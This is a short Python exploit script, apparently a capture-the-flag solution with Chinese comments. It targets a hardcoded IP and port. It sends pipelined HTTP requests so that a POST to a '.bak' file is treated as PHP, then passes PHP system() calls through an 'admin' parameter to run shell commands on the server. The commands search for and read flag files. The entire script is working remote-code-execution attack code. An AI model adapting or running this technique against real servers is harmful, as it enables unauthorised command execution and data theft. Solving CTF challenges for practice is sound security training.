#!/usr/bin/env python3
import socket
import urllib.parse
import re

# 配置目标
host = '61.147.171.105'
port = 54885

def run_command(command):
    print(f"[*] Executing: {command}")
    
    post_body = 'admin=' + urllib.parse.quote(command)
    content_len = len(post_body)
    
    # 构造 Pipelining Payload
    # 请求1: POST 到 .bak 文件 (携带命令)
    # 请求2: POST 到任意 .php 文件 (欺骗服务器进入 PHP 执行模式)
    payload = (
        f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {content_len}\r\n'
        '\r\n'
        f'{post_body}'
        'POST /aaaaa.php HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Content-Length: 0\r\n'
        '\r\n'
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload.encode())
        
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        
        decoded = response.decode('utf-8', errors='replace')
        
        # 提取响应体
        if '\r\n\r\n' in decoded:
            body = decoded.split('\r\n\r\n', 1)[1]
            print(body.strip())
        else:
            print(decoded)
            
    except Exception as e:
        print(f"Error: {e}")
    print("=" * 60)

# 执行步骤
# 1. 查找 flag
run_command('system("find / -name flag*");')

# 2. 读取 flag (请替换为上一步找到的具体文件名)
# run_command('system("cat /flag_xxxx");')